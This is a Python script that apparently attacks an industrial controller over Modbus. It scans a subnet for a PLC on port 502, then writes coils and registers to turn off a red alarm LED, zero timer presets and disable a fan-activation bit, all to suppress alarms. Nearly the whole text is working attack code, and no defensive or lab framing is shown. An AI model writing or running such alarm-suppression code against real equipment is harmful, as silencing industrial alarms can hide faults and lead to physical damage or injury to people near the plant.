from pyModbusTCP.client import ModbusClient
import socket

def find_plc_ip_address(subnet="192.168.9.0/24"):
    """Scan the given subnet for the PLC IP address using Modbus port 502."""
    subnet_base = subnet.split('/')[0].rsplit('.', 1)[0]
    for i in range(1, 255):  # Loop through IP addresses in the subnet
        ip = f"{subnet_base}.{i}"
        try:
            modbus_client = ModbusClient(host=ip, port=502, auto_open=True)
            if modbus_client.open():
                # Check connection by reading a harmless address (coil or register)
                result = modbus_client.read_coils(0, 1)
                if result:
                    print(f"[+] Found PLC IP address: {ip}")
                    return ip
            modbus_client.close()
        except Exception:
            continue
    print("[-] PLC IP address not found in the subnet.")
    return None

def alarm_suppression(plc_ip):
    """Suppress the alarm by modifying PLC memory."""
    try:
        # Initialize connection to PLC
        client = ModbusClient(host=plc_ip, port=502, auto_open=True)
        
        # Suppress alarm by manipulating appropriate memory bits
        # Example 1: Suppress the red LED alarm by setting %Q0.4 (Q_REDA) to False
        print("[*] Suppressing Alarm: Turning off Q_REDA (Fan A Red LED)")
        client.write_single_coil(4, False)  # Address 4 corresponds to %Q0.4 (outputs start at 0)

        # Example 2: Prevent timer-triggered alarms by overwriting Timer variables
        print("[*] Suppressing Timer-triggered alarms: Reset Timers")
        client.write_single_register(40000, 0)  # Example: Write 0 to Timer0 preset (modify address appropriately)
        client.write_single_register(40001, 0)  # Example: Write 0 to Timer1 preset (modify address appropriately)

        # Example 3: Toggle M_ACTFAN to disable alarm-related logic
        # (Note: exact BIT mapping for %M may need lookup depending on PLC memory map)
        print("[*] Disabling Activate_FanA (M_ACTFAN)")
        client.write_single_coil(1, False)  # Address 1 corresponds to %M1
        
        print("[+] Alarm suppression complete.")
        client.close()

    except Exception as e:
        print(f"[-] Error during alarm suppression: {e}")

if __name__ == "__main__":
    # Step 1: Automatically find the PLC IP address
    print("[*] Scanning the network for the PLC...")
    plc_ip_address = find_plc_ip_address()

    if plc_ip_address:
        # Step 2: Perform alarm suppression
        print(f"[*] Connecting to PLC at {plc_ip_address} for alarm suppression.")
        alarm_suppression(plc_ip_address)
    else:
        print("[-] Could not find PLC IP address. Exiting.")